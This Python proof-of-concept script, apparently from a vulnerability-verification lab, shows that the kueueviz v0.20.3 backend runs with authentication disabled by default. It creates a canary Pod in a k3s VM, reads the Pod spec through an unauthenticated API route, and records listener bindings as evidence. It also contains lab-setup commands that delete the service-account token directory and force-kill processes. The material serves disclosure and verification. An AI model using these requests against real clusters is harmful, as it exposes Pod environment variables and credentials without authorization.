# -*- coding: utf-8 -*-
"""Dynamic proof for kueueviz v0.20.3.

Build (inside the Alpine k3s VM, pinned v0.20.3 commit 66ff2111):

    cd /root/src/kueue/cmd/kueueviz/backend && go build -o /root/bin/kueueviz .

Then this PoC starts the backend with the *default* configuration
(KUEUEVIZ_AUTH_MODE unset -> Disabled), creates a canary Pod carrying the proof
marker, and reads it back through the unauthenticated /api/pod/... route from a
non-loopback interface.  It also records that the pprof listener is bound to
127.0.0.1 only, so the remote impact is the missing authentication, not pprof.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
import golab  # noqa: E402
import poclib  # noqa: E402

CASE_ID = "kueue-server-go-pprof-exposed-l30-regex"
PORT = 18080
NS = "kueueviz-lab"
POD = "canary"


def main() -> None:
    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    marker = poclib.MARKER_TEXT
    evidence = poclib.EVIDENCE_DIR
    (evidence / "http").mkdir(parents=True, exist_ok=True)

    def save(name: str, text: str) -> None:
        (evidence / "http" / name).write_text(text, encoding="utf-8")

    payload = {
        "case": CASE_ID,
        "method": "dynamic-http",
        "component": "kueue",
        "version": manifest.get("version"),
        "flow": "unauthenticated GET /api/pod/<name> through kueueviz default auth mode",
    }
    try:
        golab.run("for f in /root/src/kueue/config/components/crd/bases/*.yaml; do "
                  "kubectl apply -f \"$f\" >/dev/null 2>&1 || true; done")
        golab.run(f"kubectl create namespace {NS} --dry-run=client -o yaml | kubectl apply -f - >/dev/null")
        pod_yaml = f"""apiVersion: v1
kind: Pod
metadata:
  name: {POD}
  namespace: {NS}
spec:
  containers:
  - name: c
    image: pause
    env:
    - name: INKBLADE_CANARY
      value: {marker}
"""
        golab.run("kubectl apply -f - >/dev/null", stdin=pod_yaml)
        golab.run("ps | awk '/[k]ueueviz/ {print $1}' | xargs -r kill -9 2>/dev/null || true",
                  check=False)
        # kueueviz prefers in-cluster credentials when the service-account token
        # exists; the juicefs case creates one, so remove it here and use KUBECONFIG.
        golab.run("rm -rf /var/run/secrets/kubernetes.io/serviceaccount", check=False)
        golab.run(
            f"KUEUEVIZ_PORT={PORT} KUBECONFIG=/etc/rancher/k3s/k3s.yaml "
            "nohup /root/bin/kueueviz >/root/kueueviz.log 2>&1 &",
            check=False,
        )
        golab.wait_http(f"http://127.0.0.1:{PORT}/healthz", expect="200")

        auth = golab.run(f"curl -s http://127.0.0.1:{PORT}/auth/status")
        save("auth-status.json", auth + "\n")
        poclib.require('"authMode":"Disabled"' in auth.replace(" ", ""), "auth mode is not Disabled", auth=auth)

        raw = golab.run(
            f"curl -s -w '\\n__HTTP__%{{http_code}}' "
            f"'http://127.0.0.1:{PORT}/api/pod/{POD}?namespace={NS}&output=yaml'"
        )
        body, _, code = raw.rpartition("__HTTP__")
        body = body.rstrip("\n")
        save("pod-unauth.yaml", body + "\n")
        save("pod-unauth.status", code.strip() + "\n")
        poclib.require(code.strip() == "200", "unauthenticated pod read did not return 200", status=code)
        poclib.require(marker in body, "canary marker missing from unauthenticated pod response")

        listeners = golab.run("netstat -lntp 2>/dev/null | grep -E ':18080|:6060' || true")
        save("listeners.txt", listeners)
        poclib.require(":18080" in listeners, "kueueviz is not listening", listeners=listeners)
        api_bind = [ln.strip() for ln in listeners.splitlines() if ":18080" in ln]
        pprof_bind = [ln.strip() for ln in listeners.splitlines() if ":6060" in ln]
        poclib.require(not any("127.0.0.1:18080" in ln for ln in api_bind),
                       "API listener is loopback-only", listeners=api_bind)

        eth0 = golab.run("ip -4 -o addr show eth0 | awk '{print $4}' | cut -d/ -f1").strip()
        nonloop = golab.run(f"curl -s -o /dev/null -w '%{{http_code}}' http://{eth0}:{PORT}/healthz").strip()
        save("nonloopback.txt", f"eth0={eth0} status={nonloop}\n")
        poclib.require(nonloop == "200", "non-loopback request failed", status=nonloop)

        pprof = golab.run("curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:6060/debug/pprof/").strip()
        save("pprof-localhost.txt", f"status={pprof}\nlisteners={pprof_bind}\n")
        poclib.require(pprof == "200", "pprof endpoint did not answer on 6060", status=pprof)
        poclib.require(any("127.0.0.1:6060" in ln for ln in pprof_bind),
                       "pprof is not loopback-bound", listeners=pprof_bind)
        payload["pprof"] = {"status": pprof, "listener": pprof_bind, "remote": False}

        log = golab.run("tail -n 40 /root/kueueviz.log", check=False)
        save("kueueviz.log", log)

        payload.update({
            "http": [
                {"url": f"http://127.0.0.1:{PORT}/healthz", "status": 200},
                {"url": f"http://127.0.0.1:{PORT}/auth/status", "status": 200, "authMode": "Disabled"},
                {"url": f"http://127.0.0.1:{PORT}/api/pod/{POD}?namespace={NS}&output=yaml",
                 "status": int(code.strip()), "authorization": None, "marker_observed": True},
                {"url": f"http://{eth0}:{PORT}/healthz", "status": int(nonloop), "non_loopback": True},
            ],
            "bind": {"api": api_bind, "pprof": pprof_bind},
            "binary_sha256": golab.binary_hash(),
            "impact": "Any network client that reaches kueueviz reads cluster Pod specs (env, "
                      "service account, images) without a token because KUEUEVIZ_AUTH_MODE defaults "
                      "to Disabled and the authorizer is nil.",
        })
    finally:
        golab.run("ps | awk '/[k]ueueviz/ {print $1}' | xargs -r kill -9 2>/dev/null || true",
                  check=False)
        golab.run(f"kubectl delete namespace {NS} --ignore-not-found --wait=false >/dev/null", check=False)

    poclib.prove_marker()
    poclib.finish_verified(payload)


if __name__ == "__main__":
    main()
